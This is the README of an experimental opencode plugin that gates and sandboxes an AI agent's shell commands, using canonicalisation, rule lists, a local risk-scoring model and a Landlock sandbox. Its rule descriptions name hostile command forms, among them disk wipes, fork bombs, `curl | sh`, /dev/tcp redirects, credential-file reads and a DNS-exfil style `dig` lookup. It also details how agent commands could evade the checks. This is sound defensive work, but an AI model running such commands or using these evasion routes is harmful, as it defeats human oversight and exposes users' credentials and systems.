# opencode-automode

Local auto mode for opencode 2.x permission prompts. Nothing leaves the machine.

> **Experimental.** This decides which commands an AI agent may run without asking you, and
> sandboxes them. It has had several rounds of AI-assisted review but no independent security
> audit. Use it to get fewer prompts, not as a boundary you rely on against a determined
> adversary. See [SECURITY.md](SECURITY.md) for what to report and how.

For each shell tool call:

1. **One spelling.** `canon.ts` reads the command as bash reads it and prints it back in one
   plain spelling that bash and the rules cannot read differently: each word bare or in single
   quotes, braces expanded into the words bash would make of them, comments and
   backslash-newlines gone, backticks written as `$(...)`, every heredoc under a fresh
   delimiter, and the code handed to a nested `bash -c`, `sh -c`, `dash -c` or `eval` printed
   the same way. Everything below is decided on the printed text, and when the command is
   allowed **the printed text is what runs**, in place of the text the agent wrote. opencode's
   prompt shows the command as the agent issued it; the decision log holds both where they
   differ (`command` and `runs`). A command that cannot be printed asks, and what you approve
   runs as issued. The cost is a prompt on text that bash accepts and the printer does not
   print: `$'...'` and `$"..."` quoting; `${x@P}`, `${!x}`, quotes, a blank or an operator
   inside `${...}`, and `${...}` nested deeply; `$[...]`; an array assignment (`a=(1 2)`) or
   an array element where an assignment may stand (`a[0]=1`); braces where bash expands none
   or reads the word first (the word that names a command, a redirect's target, an
   assignment, a function's name, a loop's variable, a `case` word or pattern, inside
   `[[ ]]`); a word with both an expansion and a brace expansion (`$e{-delete,}`) or a `$`
   in a word with braces (`{$,a}x`); a private-use character in a word with braces, and a
   brace expansion too large to list; a glob in the target of a redirect; a parenthesis, `;`,
   a single `|` or `&`, `<`, `>` or a line break inside `[[ ]]` (so `[[ $x =~ ^(a|b)$ ]]`
   asks), and a `(` straight after `@`, `!`, `+`, `*` or `?` in a word (extglob reads it as
   one pattern); `>& file`, `>!`, `<>`, `|&`, a `{name}` or a quoted number straight before a
   redirect; a heredoc delimiter that is not one plain or fully quoted word, a heredoc
   inside `${...}`, a `case` statement inside a substitution; a backslash inside backticks,
   and backticks around more than plain commands (`` `(cd x && pwd)` ``); unterminated
   quotes and substitutions; a quoted or escaped word where a command begins that reads as
   `NAME=value` or as a keyword, a quoted `export`, `declare`, `typeset`, `local` or
   `readonly`, and a function name written with quotes; `coproc`; `time` straight after a
   `|`, and `-p` or `--` after `time` and a redirect; a descriptor copy (`<&N`) on `cd`,
   `pushd` or `popd`, or on a compound command in a call that changes directory; control
   characters other than tab and newline, U+2028 and U+2029, and a non-ASCII space outside
   quotes; a command line that starts with `-` or `+`. For a nested shell or `eval`: code
   built from a variable, a substitution or a glob; a nested shell or an `eval` in a command
   that defines a function, and code for `eval` that defines one; a program named like a
   shell at a path the checks do not know, with `-c` (`/tmp/bash -c ...`); and code for `sh`
   or `dash` that only bash reads this way (braces, `[[ ]]`, `<<<`, `&>`, a pattern that
   could match `.` or `..`, such as `sh -c 'ls .*'`). `test/canon.test.mts` holds the printer to bash, and
   `test/differential.test.mts` runs the printed text against the text as written (see
   Tests).
2. **Rules.** [pi-automode-classifier](https://github.com/deepu105/pi-automode-classifier)'s
   `rules.ts` (v0.4.1, MIT, vendored unchanged) parses the whole printed command, including
   `$(...)`, `bash -c`, wrappers like `sudo`/`timeout`, redirects and pipelines:
   - **deny**: wipes of `/`, `$HOME` or system dirs, `mkfs`, `dd` to disks, fork bombs
   - **ask**: `sudo`, pushes, `ssh`/`scp`, outbound data, `curl | sh`, credential reads, writes
     outside the project, changes to opencode's config, `AGENTS.md`/`CLAUDE.md`, `.claude/`,
     `.agents/` or this plugin, and a write to any path with a `.git` component. The plugin
     reads a write target as bash would make it: a glob is matched as bash 5.2 matches it,
     POSIX classes included (`cp x .g[[:alpha:]]t/config`; an equivalence class or a
     collating symbol counts as any character, and a glob the matcher cannot read asks), and
     braces are expanded by the printer. `cp -t`, `sort -o`, git's `--output`,
     `format-patch -o`, `tar -C`, `unzip -d`, `find -fprint0` and rsync's `--log-file`,
     `--write-batch`, `--backup-dir`, `--temp-dir` and `--partial-dir` are held to the same
     test, and so is a write that lands in a `.git` where the command runs
     (`cd .git/hooks && echo x > pre-commit`).
     Plus this plugin's additions (`DEFAULT_ASK` in `decide.ts`, and `guard.ts`): tokens on a
     `curl` line, hunting for credential files, git's own `-c` overrides outside a short
     list, `GIT_*`/`SSH_*`/`LD_*` environment however it is set (`NAME=`, `export`,
     `declare`, `printf -v`, a nameref, a computed name; but not `GIT_PAGER=cat`, nor an
     editor that does nothing before a git command that would open one), anything naming
     the project's opencode config (`opencode.json`, `.opencode/`) or a hook manager's files
     (`.husky/`, `lefthook.yml`, `.pre-commit-config.yaml`), and the git commands that
     write `.git/config`, make a repository or write the sparse-checkout file, because git's
     config is read-only inside the sandbox. Those are read by the position of each word, as
     git reads them: `git config` with a name and a value or with `set`/`unset` and the other
     writing actions (`git config <name>`, `get` and `list` are reads), `init`, `clone`,
     `sparse-checkout`, every `submodule` action but `status` and `summary`, every `worktree`
     action but `list`, `branch -u`/`-m`/`-c`/`--track`/`--edit-description`, `push -u`,
     `checkout`/`switch` with `--track` or from a remote start point (the start point is
     resolved with git, and one that cannot be resolved asks), `fetch --filter`,
     `fetch`/`pull --set-upstream`, and `git remote set-branches`. Text that only mentions
     such a command (`echo git init`) is not read as one.
     `curl` and `wget` pass only with options whose whole effect the check computes: a
     method other than GET or HEAD, `--url @file`, and options such as `-x`, `-nH`, `-r`
     and `--proto-redir` ask; a file `curl` reads through a `file:` URL is held to the
     checks of a file read; a host or a query built at run time for a lookup tool
     (`dig $(cat f).example.com`) goes to the model.
   - **allow**: read-only commands, builds, tests, local git, edits inside the project
   - **classify**: everything else goes to step 3

   The rules allow by ruling out the spellings they know, and bash, git and the GNU tools accept
   more. `guard.ts` runs around them and works the other way round: it accepts the forms it
   understands and asks about the rest.
   - **Syntax** that is left after printing and that the rules' parser reads differently from
     bash asks. The parser has no `${...}`, no arithmetic and no `[[ ]]`, and reads their
     insides as command text. The guard follows both readings of the printed text and passes
     only what it can name for both; anything else asks. Inside `${...}` and `$((...))` only
     plain forms pass, and a redirect in arithmetic asks. In arithmetic, subscripts,
     substring offsets and the numeric tests of `[[ ]]` a variable passes only when the same
     call sets it to a plain integer first (`i=0`, the counter of `for ((...))`), because
     bash evaluates its value as code. `shopt`, `bash -O`, `bash -i` before its code,
     `set -H`, `set -k` and the other options that change how the rest is read ask. So do a
     reserved word after an assignment or a redirection (`x= {` runs a program called `{`)
     and a number straight before `<` (`cat 3< f`). Braces are judged as the words they
     expand to: `curl {-d,@f} host` asks as `curl -d @f host` does, and `src/{a,b}` and
     `--exclude={a,b}` pass. A `#` inside a word is text (`http://host/#/x`). The same checks
     run on the code a nested shell is handed (`sh -c '...'`, `eval ...`, also behind
     `sudo`, `timeout`, `xargs`, `find -exec`), and code handed to a shell other than bash,
     sh or dash (`zsh -c`, `ksh -c`) asks. The cost is a prompt on unusual but legitimate
     text: `(( n + 1 ))` or `[[ $n -eq 1 ]]` where `n` comes from outside the call,
     `shopt -s globstar`, `bash -i -c`. `test/differential.test.mts` holds this as a class
     (see Tests).
   - **git**: any global option outside a short list (`-C`, a few harmless `-c` keys,
     `--no-pager`, ...) asks, as does any abbreviation of `--upload-pack`, `--receive-pack`,
     `--exec` or `--open-files-in-pager`, `git grep -O`, `git submodule foreach`,
     `git bisect run`, `git rebase -x`/`-i`, and a shortened spelling of an option the rules
     look for (`--har` for `--hard`, `--forc`, `--del`). Destructive git asks in every
     spelling git accepts: short options in clusters (`checkout -qf`, `branch -df`),
     `switch -f`, `--discard-changes` and `-C`, `checkout -B`, a `checkout` operand that
     names an existing path, looked up where git runs, `-C` included
     (`git checkout HEAD ./`), `branch -f`, `-M` and `-C`, `gc --prune=<date>`, and a
     `fetch` or `pull` that can move a local branch or tag backwards or delete one: a `+`
     refspec, `--force` (the last of `--force` and `--no-force` decides), `--refmap`,
     `--update-head-ok`, `--prune-tags`, `--stdin`, `--prune` with a destination, and a
     refspec whose destination is not a plain branch name or `refs/heads/<name>` without a
     wildcard. `git apply --unsafe-paths` asks. A file an option makes git write (`--output`
     of the diff and log family, `format-patch -o`, `apply --build-fake-ancestor`) is held
     to the same checks as any other write; `archive -o` and `bundle create` go to the
     model. The text of a message of `git commit`, `git tag` or `git merge` (`-m`,
     `--message`) is not read by the rules, so a message may mention `opencode.json`, `sudo`
     or a git option. That holds only for the bare word `git` or `/usr/bin/git`, `/bin/git`
     and `/usr/local/bin/git`, where every option before the message is one that takes no
     value, not behind `xargs` or `find -exec`, and not in a command that defines a
     function; the message of `git stash push -m` is read like any other
     word. A word named like a credential file is read as a file wherever it stands:
     `git log -1 secrets.json` asks even when `secrets.json` is a branch.
   - **Per command**, also inside `sh -c`, `sudo`, `xargs`, with the program named by path
     (`/usr/bin/npm`), and behind every wrapper and runner the rules look through
     (`timeout 60`, `nice -n 5`, `uv run`, `poetry run`, `pipenv run`, `pdm run`,
     `hatch run`, `pnpm exec`, `bundle exec`, every `find -exec`), each read with its own
     options. A wrapper or runner option the guard cannot read asks, and so does one that
     makes the rules judge another program than the one that runs: `env -u X npm test` and
     `timeout -s KILL 60 npm test` ask, because the rules judge `X` and `KILL`. Then, per
     command: printing the environment (`env`, `printenv`, bare `export`/`set`);
     setting `PATH`, `HOME`, `IFS`, `XDG_*`, `GIT_*`, `LD_*`, the variables that make one
     program run or load another (`TAR_OPTIONS`, `MAKEFILES`, `RIPGREP_CONFIG_PATH`,
     `MANOPT`, `MANPAGER`, `LESSOPEN`, `KUBECONFIG`, `AWS_*`, `YARN_*`, ...) and others that
     change what runs, except for values that change nothing that runs: `NODE_OPTIONS` made
     only of options that load no code (`--max-old-space-size=8192`), `PAGER=cat`,
     `GIT_PAGER=cat`, `CC` and `CXX` set to a bare compiler name (`clang`, `g++-13`), and a
     `PYTHONPATH` whose every entry is inside the project; package installs
     (`npm install/i/ci/add`, bare `yarn`, `pip install`, `uv add`, `cargo install`/`add`,
     `go install`, `go run pkg@version`, `npm audit fix`, `uv run --with`); an option before
     a package manager's subcommand outside a short list of global options
     (`pnpm --filter web test`, `npm --prefix web run build`, `yarn --cwd x test`,
     `cargo -q build` and `go -C dir test` pass, with a directory inside the project), and
     options that pick the program scripts run with (npm's `--script-shell` and
     `--node-options`, cargo's `--config`, go's `-toolexec`); a variable from that list set
     without `NAME=` (`for PATH in`, `for PATH;`, `unset PATH`, `read`, `printf -v`,
     `mapfile`, `getopts`, `${NAME:=x}`, arithmetic such as `(( PATH=1 ))`), `set -a` and
     `set -o allexport`, and `export NAME` of a name the call assigns elsewhere, judged as
     that assignment; options that make a program run another (tar `--checkpoint-action`,
     `-I`, `--to-command`, `-F`; `sort --compress-program`; `make --eval`, `make -f -` or a
     makefile from standard input, a device or a pipe, also through a symbolic link, and
     `NAME=value` arguments of make on the environment's terms; `fd -x`; `rg --pre`;
     `man -P`, `-H` and `-C`); builtins that evaluate a value as arithmetic (`let`,
     `declare -i`, `test -v` with a subscript); a glob that matches a file whose name
     starts with `-` (`ls *` beside a file called `-rf`), and a command that makes such a
     file (`touch ./--x`, `echo x > --x`); `/dev/tcp/...` and `/dev/udp/...` as the target
     of an input redirect; and a credential file named by a glob or braces (`cat .env*`), handed
     to a command by an input redirect at any depth (`exec < F`, `$(< F)`), entered with
     `cd`, or read as a list of names, patterns or code (`file -f`, `grep -f`,
     `wc --files0-from`). `set -x` asks only together with `PS4` or `BASH_XTRACEFD`. Your own
     `ask`/`deny`/`classify` rules also match a program named by path.
   - **`npx`** is never allowed by rule. `npx X` (also with `--no-install` or `--no`) goes
     to the model when the project has `node_modules/.bin/X`, and asks otherwise: npx would
     download a package of that name, or run a program from outside the project. An `npx`
     call also asks when any other part of it spells `node_modules`: another command, a
     string, a redirect. Only the words after the tool's name may spell it. Nothing else
     about the other commands of the call is read; what they do to the installed tool
     without spelling that name is the model's to judge, and the model is shown the whole
     call. The cost: `npx tsc --noEmit 2>&1 | grep -v node_modules` and
     `ls node_modules/.bin; npx tsc` ask.
   - **Where a command runs.** Relative paths are judged in the directory the command runs
     in, and that directory counts as known only in one shape of call: every `cd` is
     `cd [-L|-P|--] <word>` with no redirect, outside loops, branches and function bodies,
     and its word is a literal path, `~`, `$HOME`, `$PWD`, `$(pwd)` or
     `$(git rev-parse --show-toplevel)` (with an optional `/...` after it) that names a
     directory there now, or a directory the call made just before with `mkdir`. A `cd` is
     followed by its text, as bash follows it (`cd sub/link && cd ..` is `sub`). A call
     with any other `cd`, a `pushd` or a `popd` goes to the model whole
     (`cd $dir && ls`, `cd -`), or asks where the rules themselves would judge a relative
     path in the wrong directory (`if ...; then cd x; fi; cat f`). `~+` is read as the
     directory the command runs in; a path through `~-` goes to the model.
   - **To the model instead of an allow**: running a file the session may have changed. A
     file that is about to run is judged by its own change time: one changed at or after the
     moment the plugin was loaded goes to the model, whoever changed it, and so does one
     whose change time cannot be read (`sh x.sh` after `printf ... > x.sh`, `./build.sh`
     after `sed -i`; the model is shown the start of the file). That covers a shell or an
     interpreter given the file, the file run by its path, `awk -f`, `sed -f`, `make -f`,
     `go run` and `pytest` when they name it. As a second line the plugin keeps what the
     session wrote, for the whole session, approved commands included: once the session has
     written a file into the project, every program run there goes to the model unless it
     is on a short safe list (shell syntax and builtins, text and archive tools, `curl` and
     `wget`, git's readers). So after `echo x > notes.txt`, `make`, `npm test`,
     `cargo build`, `pytest`, `tsc`, `eslint` and `./build.sh` all go to the model, and the
     reason names the file; `ls`, `grep` and `git status` stay allows. A write to `/tmp`
     does not count for the project. A write the check cannot place (an archive
     extraction, `patch`, `git apply`, a recursive copy) marks the directory it ran in;
     after a git command that writes the work tree (`pull`, `merge`, `checkout`, `rebase`,
     `stash pop`, `reset`) only the files git changed count, once the call is over. In a
     session that has written nothing where they run, `make`, `npm test` and `cargo build`
     are allows and run the project's code without the model seeing it. Also to the model:
     a `sed` script with more than substitutions, prints and deletes (sed can run commands
     and write files); an `awk` program with `system`, `getline` or `@` (gawk's indirect
     call), or with a `>` or a `|` anywhere after its first `print`, checked in every `-e`
     and `--source`, and one loaded with `-f`, `-i` or `-l` (plain `awk '{print $1}' f` and
     `awk '$3 > max' f` are allows); a file to read that bash names at run time
     (`cat "$f"`), unless it is the variable of a `for f in <files>` loop whose files are
     known (`for f in *.ts; do head -3 "$f"; done` is an allow; a `$` bash leaves alone, as
     in `sed -n '5,$p' f`, names nothing) or a variable the call itself plainly sets to a
     literal at its start (`name=foo; grep "$name" src` is judged as `grep foo src`); a
     word that could become an option once bash expands it, for a program whose options
     are checked (`git diff $BASE`, `find "$dir" -name x`, `make $target`); a `~` that bash
     leaves as it is and the rules read as your home directory (`ls ~'/x'`; quoted text
     that merely holds a `~`, as in `grep '~' f`, goes too); `make NAME=value` whose value
     is not a plain word; `read` into a name that is not plain lower case (`read X`);
     `node --test`, `node -e` and `python3 -c`; and other variables set for a command
     (`FOO=1 ls`, `export FOO=1`; a variable set on a line of its own stays in the shell
     and is not asked about, unless opencode's own environment already exports it: then it
     reaches the programs that follow and is judged as `export` would be).
3. **Kev.** Kev-0.8B on llama.cpp's `llama-server` (`/v1/systemone`) scores "is this command
   risky?". Below `askAbove` (0.2) it runs; otherwise it asks. Down, slow (> `timeoutMs`),
   garbled or out-of-range (not between 0 and 1) answers ask. The plugin never turns an error
   into an allow. The server listens on a unix socket in your runtime directory
   (`$XDG_RUNTIME_DIR/opencode-automode/kev.sock`), which sandboxed commands can neither see
   nor write. Do not move it to a TCP port: while the service is down, any local process, a
   sandboxed one included, can bind the port and answer "not risky".
4. **Sandbox.** Every auto-allowed command runs with its shell swapped for `sandbox/bin/bash`
   (or `sandbox/bin/sh`, when opencode's `sh` really is bash after every symbolic link), a
   link to `sandbox/lockwrite`, which starts the real shell inside a private user + mount +
   PID + IPC namespace (no root needed), then under Landlock, and hands it the printed
   command in place of the text opencode passed.
   `lockwrite` refuses to start as root (uid 0), so with opencode running as root, in a
   container say, the self-test fails and every command asks; and it refuses to run a command
   whose stdin, stdout or stderr is a terminal (exit 126; opencode gives its shell none):
   - **Writes** only beneath the project's checkouts, `allowedPaths`, temp dirs,
     `sandboxWritable`, `/dev/null`, `/dev/zero`, `/dev/full` and a private `/dev/shm`.
     Everything else is mounted read-only as well, so `chmod`, `touch -d` and `setxattr` fail
     there too. Terminals (`/dev/tty`, `/dev/ptmx`, `/dev/pts`) are not writable and no device
     opened inside the sandbox accepts an ioctl. **No build cache is writable by default**:
     `~/.cargo/registry`, the pnpm store, `~/.m2`, Go's build cache and the like hold code
     that later builds run outside the sandbox. A build whose dependencies are already in the
     cache works against it read-only (`cargo build` and `cargo test` do, with a crate from
     `~/.cargo/registry`); a build that must fetch or write a shared cache fails with
     "Read-only file system". List the directory in `sandboxWritable` if you accept that, or
     run the fetch step yourself.
   - **Git directories** found under the project, `allowedPaths` and temp dirs (main, linked
     worktrees, submodules, bare repos; at any depth, `node_modules` included) are read-only
     all the way down, mounts beneath them included, as are `.git` pointer files, every
     repository's `core.hooksPath` (a relative one, global or not, in every worktree that
     leads to the repository, and under the git directory itself, where a push into the
     repository runs its hooks; where that place does not exist yet, its appearance pauses
     the session), files that `.git/config` includes (as deep as git follows
     them), the known hook-manager files (`.husky/`, `lefthook.yml` and its variants,
     `.pre-commit-config.yaml`, `.overcommit.yml`) and opencode's project files
     (`opencode.json[c]`, `.opencode/`, `.claude/`, `.agents/`, `AGENTS.md`, `CLAUDE.md`, in
     the session directory and each writable parent). The plugin creates an empty `.opencode/` in the
     session directory (git does not show empty directories) so that it can be made read-only
     rather than appear later with a plugin in it. Every directory between a writable root and
     a protected or hidden path is pinned, so no parent can be renamed and rebuilt. A mount
     holds a directory in place, not a symbolic link: when a link lies on the way to a
     protected path, or a `.git` is itself a link, the command asks; so does a symbolic link
     inside a git directory that is read-only for the command when it leads to a place the
     command may write (`.git/refs` linked into the project). A tool call made only of
     plain git commands in plain words (`add`, `commit`, `checkout`, `rebase`, `fetch`,
     `push`, `remote update`, `bisect start`, `apply --index`, ..., no variables, `--output`
     or `--exec`) may write inside the git directories of the repositories it works in,
     except hooks, config and `commondir`, and cannot rename them: a call in a submodule gets
     that submodule's git directory and nothing around it, a call in a linked worktree its
     own admin directory and the common directory, not the main checkout's modules nor the
     other worktrees' directories; a push to a repository on this machine gets its
     destination. The commands may stand on lines of their own; output may go to
     `/dev/null` or `2>&1`; the call may end in `|| true`, or in a pipe into `head` or `tail`
     with only a count (not both: `git commit -m x 2>&1 | tail -5 || true` is an allow by
     rule and then asks, because it gets no writable `.git`); a glob may stand in a path
     operand of `git add`, `rm`, `mv` and `restore` when it starts with a plain path segment
     (`git add src/*.ts`) or stands after `--` (`git add -- *.ts`); `!` may stand in double
     quotes (`-m "feat!: x"`); a commit message may come from `"$(cat <<'EOF' ... EOF)"`
     whatever the body holds (also `<<"EOF"`, and `<<EOF` when the body has no `$`, backtick
     or backslash); a `cd` may go
     to a literal directory, `"$HOME"`, `"$PWD"`, `"$(pwd)"` or
     `"$(git rev-parse --show-toplevel)"`; and `GIT_EDITOR=true` (or `:`),
     `GIT_SEQUENCE_EDITOR=true` or `GIT_MERGE_AUTOEDIT=no` may stand before `git commit`,
     `git merge` or a `--continue`. A git command that only reads needs no writable `.git`.
     When opencode's own environment holds a variable that points git at another repository
     or configuration (`GIT_DIR`, `GIT_WORK_TREE`, `GIT_INDEX_FILE`, `GIT_CONFIG_COUNT`,
     ...), every call that holds a git command asks and names the variable, whatever
     `sandboxKeepEnv` says; the same holds when a session's shell has another value than
     opencode for `GIT_CONFIG_GLOBAL`, `GIT_CONFIG_SYSTEM`, `GIT_CONFIG_NOSYSTEM`,
     `GIT_CEILING_DIRECTORIES`, `GIT_DISCOVERY_ACROSS_FILESYSTEM` or
     `GIT_NO_REPLACE_OBJECTS`.
   - **Hidden**: your whole runtime directory (systemd user manager, D-Bus session bus,
     gpg-agent, other tools' sockets), the system D-Bus, Docker, containerd, podman, libvirt,
     LXD and X11 socket directories, any other socket under `/run` or the temp dirs that you
     can connect to (at any depth), any directory there that you can enter or write but not
     list (what is in it cannot be seen, so it is covered whole), and credential locations: `~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.kube`,
     `~/.netrc`, `~/.git-credentials`, `~/.config/git/credentials`, `~/.npmrc`, `~/.config/gh`,
     `~/.config/glab-cli`, `~/.config/op`, `~/.config/gcloud`, keyrings, shell histories
     (bash, zsh, fish, atuin), browser profiles, `~/.gem/credentials`, composer's and
     containers' `auth.json`, Kerberos ticket caches, `~/.m2/settings.xml`, opencode's config, data and state directories (the state holds the
     local server's password), this plugin's state directory (the decision log), following
     `XDG_*_HOME`, plus `sandboxHidePaths`. On top of that list, every entry of `$HOME`, of its
     dot-directories and of `~/.config` and `~/.local/share` that the rules would ask about
     reading is hidden, and so are such files at any depth in the project and `allowedPaths`,
     `node_modules` and git directories included (`.env`, `*.pem`, `id_rsa`,
     `credentials.json`, ...; `.env.example` stays), together with what a symbolic link of
     such a name points to. Inside a git directory there are exceptions: under `refs`,
     `logs`, `lfs` and `annex` no file is hidden for its name (a name there comes from a
     branch, a tag or stored data, so a branch called `secrets.json` works), the four
     stores whose names are hashes are not walked (`objects`, `rr-cache`, `lfs/objects`,
     `annex/objects`), and `annex/creds` is hidden by name. `/dev/mqueue` is hidden too. A
     hidden file reads as empty and cannot be written; `sandboxShowPaths` brings one back (a
     test fixture called `server.key`, say). **Environment**: a
     variable passes only if its name is a well-known harmless one (`PATH`, `HOME`, `LANG`,
     toolchain directories, ...) or its value plainly is no secret (short, a number, a list of
     paths), and never if its name looks like a credential (`*KEY*`, `*TOKEN*`, `*SECRET*`,
     `*PASS*`, `*PWD*`, `*AUTH*`, `*DSN*`, `*JWT*`, `*WEBHOOK*`, `AWS_*`,
     `GITHUB_*`, `DISPLAY`, `XAUTHORITY`, ...). `lockwrite` drops everything not on that list
     itself, and the dropped names are logged. bash's own variables that change how a
     command is read or what it runs first (`BASH_ENV`, `ENV`, `SHELLOPTS`, `BASHOPTS`,
     `CDPATH`, `GLOBIGNORE`, `POSIXLY_CORRECT`, `IFS`, `PROMPT_COMMAND`, `PS0` to `PS4`,
     functions exported as `BASH_FUNC_*`, ...) are taken out of every shell the plugin sees
     while it is enabled: with the sandbox on or off, and for a command you approved too.
     `sandboxKeepEnv` keeps any of them by name. Private keys in `~/.ssh` are never visible.
     The ssh agent (wherever its socket lives), `known_hosts` and `config` are visible only to
     a tool call that is a single plain `git fetch/pull/push/ls-remote` at the top of one of
     the project's own checkouts (same git directory as at session start, to a remote it had
     then with unchanged URLs, the one git itself would pick when none is named, every URL
     the call uses a network URL (`https://`, `ssh://`, `host:path`) as git rewrites it,
     options from a short list, only keys from a list in the repository's config, and no
     hook that the command would run), or a single `ssh`/`scp` command. A fetch, pull or
     push that would go into cloned submodules gets no agent, because their config and hooks
     are not checked: it asks, and `--no-recurse-submodules` avoids that. The keys tools
     write into ordinary repositories and git ignores pass (VS Code's and gh's merge-base
     notes, `remote.<r>.gh-resolved`, git-lfs keys that pick no endpoint,
     `submodule.recurse`, `fetch.recurseSubmodules`, `push.default`,
     `push.recurseSubmodules`); `core.hooksPath` (husky) and `lfs.url` are refused. After
     `cd`, the command must be joined by `&&` and the
     directory must exist; a `~` that bash would not expand to your home directory
     (`~'/x'`, `~user`, `~+`) grants nothing.
   - **Nothing outlives the tool call.** The shell runs under the PID namespace's init, which
     exits with it; the kernel then kills whatever the command left in the background (a dev
     server started with `&` included). Processes outside the sandbox cannot be signalled, and
     are not listed in `/proc` where the kernel lets the sandbox mount its own (it does not in
     some containers). SysV shared memory, message queues and semaphores are private to the
     call (an IPC namespace of its own). On Linux 6.12+ abstract unix sockets are out of
     reach too; on 6.10 and 6.11 they are reachable (see Known gaps). A restricted
     process cannot mount, unmount or ptrace, so none of this can be undone from inside.

   opencode's own rules and prompts see the command as the agent issued it; an allowed
   command runs as its printed text (step 1), which the wrapper takes from the environment
   (with `sandbox: false` the plugin hands the shell the printed text itself). Commands you
   approve in a prompt run unsandboxed, as issued, with bash's own variables taken out of
   their environment (see Hidden). If an allowed command cannot be sandboxed, it asks
   instead: a shell other than bash (an `sh` that is not bash, dash included; under dash,
   zsh or any other shell every command that would be allowed asks and the prompt says so:
   set opencode's shell to bash), the sandbox self-test failed at startup, a protection
   cannot be put in place (a `core.hooksPath` behind a symlink or one git expands in a way
   the plugin does not follow, such as `~user/...`; a `.git` that is a link; a link in a
   read-only git directory that leads into a writable place), or the scan of the writable
   directories hit its limit or met a directory it cannot list. So does an allowed command
   that could only fail in the sandbox: `gh`, `docker` and the bus clients (`systemctl`,
   `loginctl`, `busctl`, `hostnamectl`, `timedatectl`, `localectl`, `resolvectl`,
   `machinectl`, `dbus-send`, `gdbus`), whose login, daemon socket or bus the sandbox
   hides (only `--version` and `--help` run without a prompt; an approved run happens
   outside the sandbox); git writing `.git` from a call that is not made only of plain git
   commands (`npm test && git commit`); a git command that writes a repository whose git
   directory lies outside the writable directories; git signing commits, tags or pushes,
   or checking signatures (`commit.gpgSign`, `tag.gpgSign`, `push.gpgSign`, `-S`, also
   switched on in the call with `-c commit.gpgsign=true`; the settings are read in the
   repository the command names); git needing the ssh agent without getting it; a pull
   that would update cloned submodules kept under `.git/modules`, a switch or checkout
   that would move a submodule, and `reset --keep`/`--merge`, `merge`, `cherry-pick` and
   `revert --abort` under `submodule.recurse` with cloned submodules; a push to a
   repository on this machine that has a receive-side hook; git logging in through a
   credential helper, including one set for a URL (`credential.https://github.com.helper`,
   which `gh auth setup-git` writes). So with any credential helper for an HTTPS remote,
   every fetch, pull and push asks: that is the price of hiding credentials.

   opencode runs the tool calls of one message at the same time and does not say which shell
   belongs to which call, so a shell is sandboxed only when every identical command waiting
   for one is an allow. If two identical commands issued together get different verdicts, both
   ask, and the one that would have been allowed may still run sandboxed when you approve it:
   the one case where an approved command is not run as is. The plugin also keeps track of
   which calls may still be running, until no process of theirs is left (a call run in the
   background ends its tool call while its process runs). While a push that
   `allowFeatureBranchPush` checked may be running, every call that gets a writable `.git`
   asks (a git reader that can run an external diff or textconv included), and a push asks
   while such a call, or any call that asked, may be running; a push run in the background
   asks.

The plugin records the project's git layout at session start, nested repositories and pointer
files included, and checks it before every decision. A git directory is known by the device
and inode of a descriptor the plugin holds open on it (one descriptor per git directory for
the length of the session), so one moved away and replaced is noticed; a restart of opencode
takes a fresh record of what is there then. Repositories outside the project (in
`allowedPaths` and the temp directories) are recorded for the length of a call that gets a
writable `.git` there. A `commondir` already in the main checkout's `.git` at session start
pauses once, and resuming accepts it. If the layout changes in a way git never does
itself (a `.git` replaced or moved, a pointer file rewritten, `commondir` or `config.worktree`
planted, a repository, a `.git` symbolic link, a linked worktree or one of opencode's project
files appearing where there was none, at any depth, `node_modules` included; anything
appearing inside a `.opencode` directory opencode loads from; a hook manager's file appearing
at the top of a checkout), auto-allow pauses. This is also what covers an archive
extraction or a patch, whose file names no command line shows. The prompt and opencode's log
say what was found and where. Deleting a nested repository does not pause.

A tool call made only of git commands may write inside `.git`, so after one, the state a
rebase, merge, cherry-pick, revert, am or bisect leaves in a git directory (`rebase-merge/`,
`rebase-apply/`, `sequencer/`, `MERGE_HEAD`, `MERGE_MSG`, `CHERRY_PICK_HEAD`, `REVERT_HEAD`,
`REBASE_HEAD`, `AUTO_MERGE`, `BISECT_*`, ...; in a linked worktree's git directory too) pauses
auto-allow when none of the call's own subcommands leaves it: `git merge` and `git pull` may
leave a merge's, `git rebase` and `git pull` a rebase's, `git cherry-pick` and `git revert`
theirs and `sequencer/`, `git bisect` the `BISECT_*` files, `git stash pop` only
`AUTO_MERGE`. A rebase's todo list that changes during a call that is no rebase pauses too,
and so does an `exec` line added to it during any such call: your next
`git rebase --continue` would run it. A conflict-stopped `git rebase`, `git merge` or
`git cherry-pick` does not pause. State that was there before the call is not new, and state
that appears while no such call runs is yours.

Every call that gets a writable `.git` is also checked for planted control files: in each
repository it could write, `commondir` and `config.worktree` are compared between the call's
start and its end (when the call completes, and again when it is retired). One that is
there afterwards and was not before is moved aside under the name
`automode-quarantine-<name>-<id>` beside it, every session pauses, and the prompt names both
the file and where it went; a hooks directory that appeared where a push into the repository
would run hooks is moved aside the same way. If the rename fails the prompt says so. Only a
command you approved that names the file (`git sparse-checkout`, `git config --worktree`)
and is still running explains a new `config.worktree`. One that appears while no such call
runs is named by the layout check above and left where it is. While the command runs, the
planted file is in place: see Known gaps.

New repositories and worktrees are expected only from a `git init`, `clone`, `worktree add` or
`submodule` command that the plugin asked you about and you approved, in the place that
command named, from your approval until the command has finished. The place is read as git
reads it: the values of the command's options are skipped, and `git clone <url>` without a
directory expects the one git derives from the URL. An option the plugin does not know means no
place is expected, and what appears pauses. For a submodule command, only the `.gitmodules`
paths inside the repository the command names count. While such a window is open, other
allowed calls and edits that could write there ask; and if an allowed call that could write
there may still have been running when you approved, nothing is expected. A new worktree
joins the project on the same terms. The approved command may be written on several lines.
To resume after you have looked, run
`touch ~/.local/state/opencode-automode/resume` in your own terminal; a sandboxed command
cannot. A resume takes in what the prompt showed, as it was then: what the pause named joins
the baseline, and anything else that changed meanwhile, or a shown file that holds something
else by now, is named in a new prompt first. A directory the prompt named is compared by
everything in it, up to 20,000 entries; for a larger one the prompt says that only the first
20,000 are compared. `lockwrite` is written in Rust with one dependency, the `libc` crate, pinned by
`Cargo.lock` and built with `--locked`. The plugin's own git calls run with fsmonitor, hooks,
pagers and askpass programs disabled, and a git answer it cannot read in full (an error, a
timeout, too much output) counts as "ask", never as "nothing configured".

**The edit tool.** opencode allows edits by default. The plugin makes an edit ask when it is
outside the project, or touches the plugin, opencode's config (global or project-level), a
file inside any git directory (a bare repository included, also for a first edit before any
shell command), a `core.hooksPath` directory, a file git config includes, or a
hook manager's files; when the scan that finds those reports a problem (it stopped at its
